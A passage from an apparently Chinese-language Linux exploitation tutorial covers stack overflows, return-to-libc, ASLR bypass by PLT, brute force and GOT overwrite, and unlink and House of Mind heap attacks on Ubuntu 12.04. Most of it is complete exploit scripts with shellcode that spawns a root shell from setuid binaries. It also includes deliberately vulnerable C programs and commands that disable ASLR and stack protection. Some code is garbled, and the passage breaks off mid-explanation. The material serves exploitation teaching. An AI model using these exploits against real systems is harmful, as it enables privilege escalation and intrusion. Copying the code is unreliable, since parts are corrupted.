ebp 0x08048503 &lt;+108&gt;: ret End of assembler dump. gdb-peda$ gdb-peda$ disass bar Dump of assembler code for function bar: 0x08048477 &lt;+0&gt;: push ebp 0x08048478 &lt;+1&gt;: mov ebp,esp 0x0804847a &lt;+3&gt;: sub esp,0x108 0x08048480 &lt;+9&gt;: mov eax,DWORD PTR [ebp+0x8] 0x08048483 &lt;+12&gt;: mov DWORD PTR [esp+0x4],eax 0x08048487 &lt;+16&gt;: lea eax,[ebp-0x100] 0x0804848d &lt;+22&gt;: mov DWORD PTR [esp],eax 0x08048490 &lt;+25&gt;: call 0x8048370 &lt;strcpy@plt&gt; 0x08048495 &lt;+30&gt;: leave 0x08048496 &lt;+31&gt;: ret End of assembler dump. gdb-peda$ disass foo Dump of assembler code for function foo: 0x08048464 &lt;+0&gt;: push ebp 0x08048465 &lt;+1&gt;: mov ebp,esp 0x08048467 &lt;+3&gt;: sub esp,0x4 0x0804846a &lt;+6&gt;: mov eax,DWORD PTR [ebp+0x8] 0x0804846d &lt;+9&gt;: mov DWORD PTR [esp],eax 0x08048470 &lt;+12&gt;: call 0x8048477 &lt;bar&gt; 0x08048475 &lt;+17&gt;: leave 0x08048476 &lt;+18&gt;: ret End of assembler dump. gdb-peda$ 堆栈布局： 当我们已经知道256字节的用户输入，用空字节可以覆盖foo的EBP的LSB。所以当foo的存储在目标缓冲区buf之上的EBP被一个NULL字节所覆盖时，ebp从0xbffff2d8变为0xbffff200。从堆栈布局我们可以看到堆栈位置0xbffff200是目标缓冲区buf的一部分，由于用户输入被复制到该目标缓冲区，攻击者可以控制这个堆栈位置0xbffff200，因此他控制指令指针eip使用他可以实现任意代码执行。让我们通过发送一系列256的A来测试它。 测试步骤1：EBP是否覆盖，从而可能覆盖返回地址？ 显示eip已经被AAAA覆盖。 返回地址位于buf的偏移量0xac处。有了这些信息，我们可以编写一个漏洞利用程序来实现任意的代码执行。 漏洞代码： 123456789101112131415161718 #exp.py #!/usr/bin/env python import struct from subprocess import call #Spawn a shell. #execve(/bin/sh) Size- 28 bytes. scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90" ret_addr = 0xbffff218 #endianess conversion def conv(num): return struct.pack("&lt;I",num) #turn Address + NOP's + Shellcode + Junk buf = "A" * 172 buf += conv(ret_addr) buf += "\x90" * 30 buf += scode buf += "A" * 22 print "Calling vulnerable program" call(["./test", buf]) 执行上面的exploit程序给我们root shell，如下所示： 使用return-to-libc绕过NX bit虚拟机安装：Ubuntu 12.04（x86） NT Bit是一种利用缓解技术，使某些内存区域不可执行，并使可执行区域不可写。比如，使数据，堆栈和堆段不可执行，而代码段不可写。在NX Bit打开的情况下，我们基于堆栈的缓冲区溢出的经典方式会失败。应为在经典的方法中，shellcode被复制进堆栈中，返回地址指向shellcode。但是现在由于堆栈不再可执行，我们利用漏洞渗透失败！但是这种环节技术并不是万无一失的。还是有方法绕过NX Bit的。 漏洞代码： 1234567891011//test.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(int argc, char* argv[]) &#123; char buf[256]; /* [1] */ strcpy(buf,argv[1]); /* [2] */ printf("%s\n",buf); /* [3] */ fflush(stdout); /* [4] */ return 0; &#125; 编译命令： 12345#echo 0 &gt; /proc/sys/kernel/randomize_va_space $gcc -g -fno-stack-protector -o test test.c $sudo chown root test $sudo chgrp root test $sudo chmod +s test 我们可以使用叫做return-to-libc的攻击技术绕过NX bit。这里返回地址被一个特定的libc函数地址覆盖。比如，如果攻击者想要生成一个shell，那么它将使用system（）地址覆盖返回地址，并在堆栈中设置system（）所需的相应参数，以便调用它。在已经放汇编红会之了漏洞代码的堆栈布局后，让我们编写一个漏洞代码来绕过NX位 攻击代码： 123456789101112131415161718192021222324 #exp.py #!/usr/bin/env python import struct from subprocess import call #Since ALSR is disabled, libc base address would remain constant and hence we can easily find the function address we want by adding the offset to it. #For example system address = libc base address + system offset #where #libc base address = 0xb7e22000 (Constant address, it can also be obtained from cat /proc//maps) #system offset = 0x0003f060 (obtained from "readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system") system = 0xb7e5d0b0 #0xb7e2000+0x0003f060 exit = 0xb7e50bf0 #0xb7e2000+0x00032be0 #system_arg points to 'sh' substring of 'fflush' string. #To spawn a shell, system argument should be 'sh' and hence this is the reason for adding line [4] in vuln.c. #But incase there is no 'sh' in vulnerable binary, we can take the other approach of pushing 'sh' string at the end of user input!! system_arg = 0xb7f816a0 #(obtained from hexdump output of the binary) #endianess conversion def conv(num): return struct.pack("&lt;I",num) #system + exit + system_arg buf = "A" * 268 buf += conv(system) buf += conv(exit) buf += conv(system_arg) print "Calling vulnerable program" call(["./test", buf]) 漏洞代码中，需要3个地址。分别为system()，exit()，还有字符sh所在的地址。可以直接用gdb打印出system(),exit()函数的地址。sh字符串的地址可以使用peda插件的find功能直接查找。具体做法如下图所示： 然后运行exp.py便可以成功渗透，并给我们shellcode: 使用链接的return-to-libc绕过NX bit虚拟机安装：Ubuntu 12.04（x86） 有需要攻击者为了成功利用需要调用多个libc函数。链接多个libc函数的一种简单方法是在堆栈中放置一个libc函数地址，但是由于函数参数的原因，所以是不可能的。所以需要用链接的方式绕过检测机制。 漏洞代码： 123456789101112//test.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(int argc, char* argv[]) &#123; char buf[256]; seteuid(getuid()); /* Temporarily drop privileges */ strcpy(buf,argv[1]); printf(&quot;%s&quot;,buf); fflush(stdout); return 0; &#125; 编译命令： 12345#echo 0 &gt; /proc/sys/kernel/randomize_va_space $gcc -fno-stack-protector -g -o test test.c $sudo chown root test $sudo chgrp root test $sudo chmod +s test 前一篇文章所述，链接setuid，system和exit将允许我们能够利用漏洞代码vuln。但由于以下两个问题，不是一个直接的任务：在堆栈中的同一位置，攻击者将需要放置libc函数的函数参数或一个libc函数的函数参数和另一个libc函数的地址，这显然是不可能的（如下图所示）。其次seteuid_arg应为零。但是由于我们的缓冲区溢出是由于strcpy引起的，所以零变成一个坏的字符，ie这个零之后的字符不会被strcpy()复制到堆栈中。 为了在堆栈中放置多个libc函数或其参数，需要使用帧伪造技术。在这种技术中，而不是使用libc函数地址（本例中为seteuid）直接覆盖返回地址，我们用leave ret指令来覆盖它。这允许攻击者将堆栈中的函数参数存储起来，而不会有任何重叠，从而允许调用相应的libc函数，而不会有任何问题。当攻击者伪造帧进行缓冲区溢出时，如下图堆栈布局所示，成功链接libc函数``seteuid, system和 exit: 上图中的红色突出显示是返回地址，其中每个leave ret指令调用其上方的libc函数。例如，第一个leave ret指令（位于堆栈地址0xbffff1fc）调用seteuid()，而第二个leave ret(位于堆栈地址0xbffff20c)调用system(),第三个leave ret指令（位于堆栈地址0xbffff21c）调用exit()。 利用代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576 #exp.py #!/usr/bin/env python import struct from subprocess import call fake_ebp0 = 0xbffff1a0 fake_ebp1 = 0xbffff1b8 fake_ebp2 = 0xbffff1d0 fake_ebp3 = 0xbffff1e8 fake_ebp4 = 0xbffff204 fake_ebp5 = 0xbffff214 fake_ebp6 = 0xbffff224 fake_ebp7 = 0xbffff234 leave_ret = 0x0804851c sprintf_addr = 0xb7e6e8d0 seteuid_addr = 0xb7f09720 system_addr = 0xb7e61060 exit_addr = 0xb7e54be0 sprintf_arg1 = 0xbffff210 sprintf_arg2 = 0x80485f0 sprintf_arg3 = 0xbffff23c system_arg = 0x804829d exit_arg = 0xffffffff #endianess convertion def conv(num): return struc*.pack("pack("&lt;I",num) buf = "A"* 264 buf += conv(fake_ebp0) buf += conv(leave_ret) #Below four stack frames are for sprintf (to setup seteuid arg ) buf += conv(fake_ebp1) buf += conv(sprintf_addr) buf += conv(leave_ret) buf += conv(sprintf_arg1) buf += conv(sprintf_arg2) buf += conv(sprintf_arg3) buf += conv(fake_ebp2) buf += conv(sprintf_addr) buf += conv(leave_ret) sprintf_arg1 += 1 buf += conv(sprintf_arg1) buf += conv(sprintf_arg2) buf += conv(sprintf_arg3) buf += conv(fake_ebp3) buf += conv(sprintf_addr) buf += conv(leave_ret) sprintf_arg1 += 1 buf += conv(sprintf_arg1) buf += conv(sprintf_arg2) buf += conv(sprintf_arg3) buf += conv(fake_ebp4) buf += conv(sprintf_addr) buf += conv(leave_ret) sprintf_arg1 += 1 buf += conv(sprintf_arg1) buf += conv(sprintf_arg2) buf += conv(sprintf_arg3) #Dummy - To avoid null byte in fake_ebp4. buf += "X" * 4 #Below stack frame is for seteuid buf += conv(fake_ebp5) buf += conv(seteuid_addr) buf += conv(leave_ret) #Dummy - This arg is zero'd by above four sprintf calls buf += "Y" * 4 #Below stack frame is for system buf += conv(fake_ebp6) buf += conv(system_addr) buf += conv(leave_ret) buf += conv(system_arg) #Below stack frame is for exit buf += conv(fake_ebp7) buf += conv(exit_addr) buf += conv(leave_ret) buf += conv(exit_arg) print "Calling vulnerable program" call(["./test", buf]) 执行上述漏洞代码给我们root shell 绕过ASLR - 第一部分虚拟机安装：Ubuntu 12.04（x86） 在前面的攻击教程中，我们看到了攻击者需要知道下面两样事情 1.堆栈地址（跳转到shellcode） 2.libc基地址（成功绕过NX bit） 为了利用漏洞代码。 为了阻止攻击者的行为，安全研究人员提出了一个称为“ASLR”的漏洞利用。 地址空间布局随机化ASLR是随机化的利用缓解技术:堆栈地址，堆地址，共享库地址这三个一旦桑树地址被随机化，特别是当共享库被随机化时，我们采取的绕过NX Bit的方法不会生效，因为攻击者需要知道libc的基地址。但这种环节技术并不是万无一失的。 因为随机化被关闭，所以libc基址是常量（0xb7e22000 - 对于我们的“vuln”二进制文件）。函数偏移也是不变的（从readelf -s libc.so.6 | grep获得）现在当我们打开完全随机化（使用下面的命令） 1#echo 2 &gt; /proc/sys/kernel/randomize_va_space libc基地址将被随机化。但是libc函数的偏移量是不会变的。所以，如果我们可以绕过共享库及地址随机化，即使打开ASLR，也可以成功利用易受攻击的程序。 在这种技术中，而不是返回到libc函数。而是攻击者返回到一个函数的PLT。由于“function@PLT”不是随机的，所以攻击者不再需要预测libc的及地址，二十可以建档的返回到function@PLT来调用function。 与静态库不同，共享库代码段在多个进程之间共享，其数据段对于每一个进程是唯一的。这有助于减少内存空间和磁盘空间。由于代码段在多个进程之间共享，所以应该只有read和execute权限，英雌动态连接器不能重新定位代码段中存在的数据符号或函数地址。那么动态链接如何在运行时重新定位共享符号。 位置无关代码PIC是为了解决这个问题而开发的 - 它确保共享库代码段在多个进程之间共享，尽管在加载时执行重定位。PIC通过一级间接寻址实现这一点-共享库代码段不包含绝对虚拟地址来代替全局符号和函数引用，而是指向数据段中的特定表。该表是全局符号和函数绝对虚拟地址的占位符。动态链接器作为重定位的一部分来填充此表。因此，只有重定位数据段被修改，代码段保持不变。 全局偏移表GOT：全局偏移表包含每个全局变量的4字节条目，其中4字节条目包含全局变量的地址。当代码段中的指令引用全局变量时，而不是全局变量的绝对虚拟地址，指令指向GOT中条目。当加载共享库时，GOT条目由动态链接器重新定位。因此，PIC使用该表来重新定位具有单个间接级别的全局符号。 过程链接表PLT： 过程链接表包含每个全局函数的存根代码。代码段中的调用指令不直接调用函数function，而是调用存根代码function @ PLT。这个存根代码在动态链接器的帮助下解析了函数地址并将其复制到GOT（GOT [n]）。这次解析仅在函数function的第一次调用期间发生，稍后当代码段中的调用指令调用存根代码function @PLT时，而不是调用动态链接器来解析函数地址function存根代码直接从GOT（GOT [n]）获取功能地址并跳转到它。因此，PIC使用这个表来重新定位具有两级间接的功能地址。 漏洞代码： 12345678910111213141516 #include &lt;stdio.h&gt; #include &lt;string.h&gt; /* Eventhough shell() function isnt invoked directly, its needed here since 'system@PLT' and 'exit@PLT' stub code should be present in executable to successfully exploit it. */ void shell() &#123; system("/bin/sh"); exit(0); &#125; int main(int argc, char* argv[]) &#123; int i=0; char buf[256]; strcpy(buf,argv[1]); printf("%s\n",buf); return 0; &#125; 编译命令： 12345#echo 2 &gt; /proc/sys/kernel/randomize_va_space $gcc -g -fno-stack-protector -o test test.c $sudo chown root test $sudo chgrp root test $sudo chmod +s test 反编译test，我们可以找到system@PLT和 exit@PLT的地址。 使用这些地址我们可以写一个绕过ASLR和NX bit的漏洞利用代码。 利用代码： 12345678910111213141516#exp.py #!/usr/bin/env python import struct from subprocess import call system = 0x8048380 exit = 0x80483a0 system_arg = 0x80485b5 #Obtained from hexdump output of executable 'test' #endianess convertion def conv(num): return struct.pack("&lt;I",num) # Junk + system + exit + system_arg buf = "A" * 272 buf += conv(system) buf += conv(exit) buf += conv(system_arg) print "Calling vulnerable program" call(["./test", buf]) 执行上面的exploit程序给我们root shell，如下所示： 绕过ASLR - 第二部分虚拟机安装：Ubuntu 12.04（x86） 使用爆破技巧，来绕过共享库地址随机化。在这个教程中，攻击者选择特定的 Libc 基址，并持续攻击程序直到成功。假设你足够幸运，这个技巧是用于绕过 ASLR的最简单的技巧。 漏洞代码： 1234567891011//test.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(int argc, char* argv[]) &#123; char buf[256]; strcpy(buf,argv[1]); printf("%s\n",buf); fflush(stdout); return 0; &#125; 编译命令： 12345#echo 2 &gt; /proc/sys/kernel/randomize_va_space $gcc -fno-stack-protector -g -o test test.c $sudo chown root test $sudo chgrp root test $sudo chmod +s test 下面是（当随机化打开时）不同的 Libc 基址： 上面展示了，Libc 随机化仅限于 8 位。因此我们可以在最多 256 次尝试内，得到 root shell。在下面的利用代码中，让我们选择0xb75b5000作为Libc基址，并让我们尝试几次。 首先我们先找到system()的偏移量:0x0003f0b0 其次找到exit()的偏移量：0x0032bf0 然后找到/bin/sh的地址： 利用代码： 12345678910111213141516171819202122232425262728#exp.py #!/usr/bin/env python import struct from subprocess import call libc_base_addr = 0xb75b5000 exit_off = 0x0003f0b0 #Obtained from "readelf -s libc.so.6 | grep system" command. system_off = 0x00032bf0 #Obtained from "readelf -s libc.so.6 | grep exit" command. system_addr = libc_base_addr + system_off exit_addr = libc_base_addr + exit_off system_arg = 0xb76c06a0 #endianess convertion def conv(num): return struct.pack("&lt;I",num) #system + exit + system_arg buf = "A" * 268 buf += conv(system_addr) buf += conv(exit_addr) buf += conv(system_arg) print "Calling vulnerable program" #Multiple tries until we get lucky i = 0 while (i &lt; 256): print "Number of tries: %d" %i i += 1 ret = call(["./test", buf]) if (not ret): break else: print "Exploit failed" 运行上面的利用代码，我们会得到 root shell 绕过ASLR - 第三部分虚拟机安装：Ubuntu 12.04（x86） 让我们看看如何使用 GOT 覆盖和解引用技巧。来绕过共享库地址随机化。我们在第一部分中提到过，即使可执行文件没有所需的 PLT 桩代码，攻击者也可以使用 GOT 覆盖和解引用技巧来绕过 ASLR。 漏洞代码： 1234567891011121314151617#include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; int main (int argc, char argv) &#123; char buf[256]; int i; seteuid(getuid()); if(argc &lt; 2) &#123; puts("Need an argument\n"); exit(-1); &#125; strcpy(buf, argv[1]); printf("%s\nLen:%d\n", buf, (int)strlen(buf)); return 0; &#125; 编译命令： 12345#echo 2 &gt; /proc/sys/kernel/randomize_va_space $gcc -fno-stack-protector -o test test.c $sudo chown root test $sudo chgrp root test $sudo chmod +s test 我们发现system@PLT并没有在我们的可执行文件test中出现。字符串sh也没有在我们的可执行文件test中出现。 将特定 Libc 函数的GOT 条目覆盖为另一个Libc 函数的地址（在第一次调用之后）。但是它也可以覆盖为execve函数的地址 – 当偏移差加到GOT[getuid]的时候。我们已经知道了，在共享库中，函数距离其基址的偏移永远是固定的。所以，如果我们将两个 Libc 函数的差值（execve和getuid）加到getuid的 GOT 条目，我们就得到了execve函数的地址。之后，调用getuid就会调用execve。 ROP 是个技巧，其中攻击者一旦得到了调用栈的控制之后，他就可以执行精心构造的机器指令，来执行它所需的操作，即使没有直接的方式。例如，在 return-to-libc 攻击中，我们将返回地址覆盖为system的地址，来执行system。但是如果system（以及execve函数族）从 Libc 共享库中溢出了，攻击者就不能获得 root shell。这时，ROP 就可以拯救攻击者。在这个技巧中，即使任何所需的 Libc 函数都不存在，攻击者可以通过执行一系列的零件（gadget），来模拟所需的 Libc 函数。 Step 1：我们需要一个零件，它将偏移差加到GOT[getuid]上。所以让我们寻找一个add零件，它将结果复制到内存区域中。 Step 2：确保 EBX 包含getuid的 GOT 条目。getuid的 GOT 条目（在下面展示）位于0x804a004。因此 EBX应该为0x804a004，但是由于add零件中，固定值0x5d5b04c4加到了 EBX，所以 EBX 应减去这个固定值，也就是ebx = 0x804a004 -0x5d5b04c4 = 0xaaa99b40。 Step 3：现在我们需要寻找一个零件，它将这个值0xaaa99b40复制到 EBX 寄存器中。确保 EAX 包含偏移差。因此我们需要找到一个零件，它将偏移差复制到 EAX 寄存器中。 使用unlink堆溢出虚拟机安装：Ubuntu 12.04（x86） 使用 unlink 技巧成功利用堆溢出。 漏洞程序： 12345678910111213141516 /* Heap overflow vulnerable program. */ #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main( int argc, char *argv[] ) &#123; char *first, *second; /*[1]*/ first = malloc( 666 ); /*[2]*/ second = malloc( 12 ); if(argc!=1) /*[3]*/ strcpy( first, argv[1] ); /*[4]*/ free( first ); /*[5]*/ free( second ); /*[6]*/ return( 0 ); &#125; 上面程序的行[3]会导致堆溢出。用户输入argv[1]复制给了堆缓冲区first，没有任何大小限制。因此，当用户输入大于 666 字节时，它就会覆盖下一个块的头部。这个溢出会导致任意代码执行。 unlink：这个技巧的核心思想，就是欺骗 glibc malloc 来 unlink 第二个块。unlink free的 GOT 条目会使其被 shellcode 地址覆盖。在成功覆盖之后，现在在行[5]，free被漏洞程序调用时，shellcode就会执行。 首先我们了解一下glibc malloc ptmalloc2是从 dlmalloc分叉的。在fork之后，线程支持被添加到它并在2006年发布。在正式发布之后，ptmalloc2被集成到glibc源代码中。一旦集成，代码更改就直接转换为glibc malloc源代码本身。因此，ptmalloc2和glibc的malloc实现之间可能会有很多变化。曾经出现在这个岗位的malloc内部调用要么BRK或MMAP系统调用。由于tmalloc2的线程支持，它成为了nux的默认内存分配器。线程支持有助于提高内存分配器性能，从而提高应用程序性能。在dlmalloc中，当两个线程同时调用malloc时，只有一个线程可以进入临界区，因为freelist数据结构在所有可用线程之间共享。因此，内存分配在多线程应用程序中需要时间，从而导致性能下降。在ptmalloc2中，当两个线程同时调用malloc时，会立即分配内存，因为每个线程都维护一个单独的堆段，因此维护这些堆的空列表数据结构也是分开的。每个线程竞技场。 多个竞技场时： ​ • 当主线程，第一次调用malloc已经创建主竞技场时，没有任何争用。 ​ • 当线程1和线程2第一次调用malloc时，会为它们创建一个新的竞技场，并且它的使用没有任何争用。直到这一点，线程和竞技场都有一对一的映射。 ​ • 当线程3第一次调用malloc时，计算竞技场限制的数量。这里竞技场限制被越过，因此尝试重用现有竞技场（主竞技场或竞技场1或竞技场2） ​ • 重用： ​ • 一旦环绕可用的竞技场，循环尝试锁定该竞技场。 ​ • 如果成功锁定（让主竞技场成功锁定），请将该竞技场返回给用户。 ​ • 如果没有发现任何竞技场，则 排在下一个竞技场。 ​ • 现在当线程3调用malloc（第二次）时，malloc将尝试使用最后访问的竞技场（主竞技场）。如果主竞技场是免费的，则其使用的其他thread3将被阻止，直到主竞技场被释放。因此现在主要的竞技场在主线程和线程3之间共享。 利用程序： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758 /* Program to exploit 'test' using unlink technique. */ #include &lt;string.h&gt; #include &lt;unistd.h&gt; #define FUNCTION_POINTER ( 0x0804978c ) //Address of GOT entry for free function obtained using "objdump -R vuln". #define CODE_ADDRESS ( 0x0804a008 + 0x10 ) //Address of variable 'first' in vuln executable. #define VULNERABLE "./test" #define DUMMY 0xdefaced #define PREV_INUSE 0x1 char shellcode[] = /* Jump instruction to jump past 10 bytes. ppssssffff - Of which ffff would be overwritten by unlink function (by statement BK-&gt;fd = FD). Hence if no jump exists shell code would get corrupted by unlink function. Therefore store the actual shellcode 12 bytes past the beginning of buffer 'first'*/ "\xeb\x0assppppffff" "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; int main( void ) &#123; char * p; char argv1[ 680 + 1 ]; char * argv[] = &#123; VULNERABLE, argv1, NULL &#125;; p = argv1; /* the fd field of the first chunk */ *( (void)p ) = (void)( DUMMY ); p += 4; /* the bk field of the first chunk */ *( (void)p ) = (void)( DUMMY ); p += 4; /* the fd_nextsize field of the first chunk */ *( (void)p ) = (void)( DUMMY ); p += 4; /* the bk_nextsize field of the first chunk */ *( (void)p ) = (void)( DUMMY ); p += 4; /* Copy the shellcode */ memcpy( p, shellcode, strlen(shellcode) ); p += strlen( shellcode ); /* Padding- 16 bytes for prev_size,size,fd and bk of second chunk. 16 bytes for fd,bk,fd_nextsize,bk_nextsize of first chunk */ memset( p, 'B', (680 - 4*4) - (4*4 + strlen(shellcode)) ); p += ( 680 - 4*4 ) - ( 4*4 + strlen(shellcode) ); /* the prev_size field of the second chunk. Just make sure its an even number ie) its prev_inuse bit is unset */ *( (size_t)p ) = *size_t)( DUMMY &amp; ~PREV_INUSE ); p += 4; /* the size field of the second chunk. By setting size to -4, we trick glibc malloc to unlink second chunk.*/ *( (size_t)p ) = (size_t)( -4 ); p += 4; /* the fd field of the second chunk. It should point to free - 12. -12 is required since unlink function would do + 12 (FD-&gt;bk). This helps to overwrite the GOT entry of free with the address we have overwritten in second chunk's bk field (see below) */ *( (void)p ) = (void)( FUNCTION_POINTER - 12 ); p += 4; /* the bk field of the second chunk. It should point to shell code address.*/ *( (void)p ) = (void)( CODE_ADDRESS ); p += 4; /* the terminating NUL character */ *p = ''; /* the execution of the vulnerable program */ execve( argv[0], argv, NULL ); return( -1 ); &#125; 执行上述程序会派生新的 shell 12345szt@ubuntu:~/linux exploit/test9$ $ gcc -g -z norelro -z execstack -o test test.c -Wl,--rpath=/home/szt/glibc/glibc-inst2.20/lib -Wl,--dynamic-linker=/home/szt/glibc/glibc-inst2.20/lib/ld-linux.so. szt@ubuntu:~/linux exploit/test9$ gcc -g -o exp exp.c szt@ubuntu:~/linux exploit/test9$ ./exp szt@ubuntu:~/linux exploit/test9$ ls exp.c exp.c~ test test.c 但是运行并不成功，后来查询资料。发现是已经加强了防护。使得这种更难攻击成功。 使用 Malloc Maleficarum 的堆溢出虚拟机：Ubuntu 12.04（x86） glibc malloc 变得更可靠了。之后，类似 unlink 的技巧已经废弃，攻击者没有线索。但是在 2005 年末，Phantasmal Phatasmagoria 带来了下面这些技巧，用于成功利用堆溢出。 • House of Prime • House of Mind • House of Force • House of Lore • House of Spirit House of Mind 这个技巧中，攻击者欺骗 glibc malloc 来使用由他伪造的 arena。伪造的 arena 以这种形式构造，unsorted bin 的 fd包含free的 GOT 条目地址 -12。因此现在当漏洞程序释放某个块的时候，free的 GOT 条目被覆盖为 shellcode 的地址。在成功覆盖 GOT 之后，当漏洞程序调用free，shellcode 就会执行。 这个需要先决条件： • 在块的地址之前，需要一系列 malloc 调用– 当对齐到内存区域中HEAP_MAX_SIZE结果的倍数的时候，内存区域由攻击者控制。这是伪造的heap_info结构所在的内存区域。伪造的heap_info的 arena 指针ar_ptr会指向伪造的 arena。因此伪造的 arena 和伪造的heap_info的内存区域都能由攻击者控制。 • 一个块，它的大小字段（以及它的 arena 指针 – 预备条件 1）由攻击者控制，应该已释放。 • 上述空闲块的下一个块应该不是 top 块。 漏洞程序： 1234567891011121314151617181920212223242526272829 /* test.c House of Mind vulnerable program */ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main (void) &#123; char *ptr = malloc(1024); /* First allocated chunk */ char *ptr2; /* Second chunk/Last but one chunk */ char *ptr3; /* Last chunk */ int heap = (**int**)ptr &amp; 0xFFF00000; _Bool found = 0; int i = 2; for (i = 2; i &lt; 1024; i++) &#123; /* Prereq 1: Series of malloc calls until a chunk's address - when aligned to HEAP_MAX_SIZE results in 0x08100000 */ /* 0x08100000 is the place where fake heap_info structure is found. */ [1]**if** (!found &amp;&amp; (((**int**)(ptr2 = malloc(1024)) &amp; 0xFFF00000) == \ (heap + 0x100000))) &#123; printf("good heap allignment found on malloc() %i (%p)\n", i, ptr2); found = 1; break; &#125; &#125; [2]ptr3 = malloc(1024); /* Last chunk. Prereq 3: Next chunk to ptr2 != av-&gt;top */ /* User Input. */ [3]fread (ptr, 1024 * 1024, 1, stdin); [4]free(ptr2); /* Prereq 2: Freeing a chunk whose size and its arena pointer is controlled by the attacker. */ [5]free(ptr3); /* Shell code execution. */ return(0); /* Bye */ &#125; 漏洞程序的行[3]是堆溢出发生的地方。用户输入储存在块 1 的mem指针处，大小共计 1MB。所以为了成功利用堆溢出，攻击者提供了下面的用户输入。 利用程序： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788/* exp.c Program to generate attacker data. Command: #./exp &gt; file */ #include &lt;stdio.h&gt; #define BIN1 0xb7fd8430 char scode[] = /* Shellcode to execute linux command "id". Size - 72 bytes. */ "\x31\xc9\x83\xe9\xf4\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e" "\xc9\x6a\x42\x83\xeb\xfc\xe2\xf4\x34\xc2\x32\xdb\x0c\xaf\x02\x6f" "\x3d\x40\x8d\x2a\x71\xba\x02\x42\x36\xe6\x08\x2b\x30\x40\x89\x10" "\xb6\xc5\x6a\x42\x5e\xe6\x1f\x31\x2c\xe6\x08\x2b\x30\xe6\x03\x26" "\x5e\x9e\x39\xcb\xbf\x04\xea\x42"; char ret_str[4] = "\x00\x00\x00\x00"; void convert_endianess(int arg) &#123; int i=0; ret_str[3] = (arg &amp; 0xFF000000) &gt;&gt; 24; ret_str[2] = (arg &amp; 0x00FF0000) &gt;&gt; 16; ret_str[1] = (arg &amp; 0x0000FF00) &gt;&gt; 8; ret_str[0] = (arg &amp; 0x000000FF) &gt;&gt; 0; &#125; int main() &#123; int i=0,j=0; fwrite("\x41\x41\x41\x41", 4, 1, stdout); /* fd */ fwrite("\x41\x41\x41\x41", 4, 1, stdout); /* bk */ fwrite("\x41\x41\x41\x41", 4, 1, stdout); /* fd_nextsize */ fwrite("\x41\x41\x41\x41", 4, 1, stdout); /* bk_nextsize */ /* Fake Arena. */ fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* mutex */ fwrite("\x01\x00\x00\x00", 4, 1, stdout); /* flag */ for(i=0;i&lt;10;i++) fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* fastbinsY */ fwrite("\xb0\x0e\x10\x08", 4, 1, stdout); /* top */ fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* last_remainder */ for(i=0;i&lt;127;i++) &#123; convert_endianess(BIN1+(i*8)); if(i == 119) &#123; fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* preserve prev_size */ fwrite("\x09\x04\x00\x00", 4, 1, stdout); /* preserve size */ &#125; else if(i==0) &#123; fwrite("\xe8\x98\x04\x08", 4, 1, stdout); /* bins[i][0] = (GOT(free) - 12) */ fwrite(ret_str, 4, 1, stdout); /* bins[i][1] */ &#125; else &#123; fwrite(ret_str, 4, 1, stdout); /* bins[i][0] */ fwrite(ret_str, 4, 1, stdout); /* bins[i][1] */ &#125; &#125; for(i=0;i&lt;4;i++) &#123; fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* binmap[i] */ &#125; fwrite("\x00\x84\xfd\xb7", 4, 1, stdout); /* next */ fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* next_free */ fwrite("\x00\x60\x0c\x00", 4, 1, stdout); /* system_mem */ fwrite("\x00\x60\x0c\x00", 4, 1, stdout); /* max_system_mem */ for(i=0;i&lt;234;i++) &#123; fwrite("\x41\x41\x41\x41", 4, 1, stdout); /* PAD */ &#125; for(i=0;i&lt;722;i++) &#123; if(i==721) &#123; /* Chunk 724 contains the shellcode. */ fwrite("\xeb\x18\x00\x00", 4, 1, stdout); /* prev_size - Jmp 24 bytes */ fwrite("\x0d\x04\x00\x00", 4, 1, stdout); /* size */ fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* fd */ fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* bk */ fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* fd_nextsize */ fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* bk_nextsize */ fwrite("\x90\x90\x90\x90\x90\x90\x90\x90" \ "\x90\x90\x90\x90\x90\x90\x90\x90", 16, 1, stdout); /* NOPS */ fwrite(scode, **sizeof**(scode)-1, 1, stdout); /* SHELLCODE */ for(j=0;j&lt;230;j++) fwrite("\x42\x42\x42\x42", 4, 1, stdout); /* PAD */ continue; &#125; else &#123; fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* prev_size */ fwrite("\x09\x04\x00\x00", 4, 1, stdout); /* size */ &#125; if(i==720) &#123; for(j=0;j&lt;90;j++) fwrite("\x42\x42\x42\x42", 4, 1, stdout); /* PAD */ fwrite("\x18\xa0\x04\x08", 4, 1, stdout); /* Arena Pointer */ for(j=0;j&lt;165;j++) fwrite("\x42\x42\x42\x42", 4, 1, stdout); /* PAD */ &#125;else &#123; for(j=0;j&lt;256;j++) fwrite("\x42\x42\x42\x42", 4, 1, stdout); /* PAD */ &#125; &#125; return 0; &#125; 在攻击者生成数据作为用户输入之后，glibc malloc 执行下列事情，当漏洞程序的行[4]执行时： Step 1：正在释放的堆的 arena 由访问arena_for_chunk获取。 Step 2：使用 arena 指针和块地址作为参数调用_int_free。我们这里，arena 指针指向了伪造的 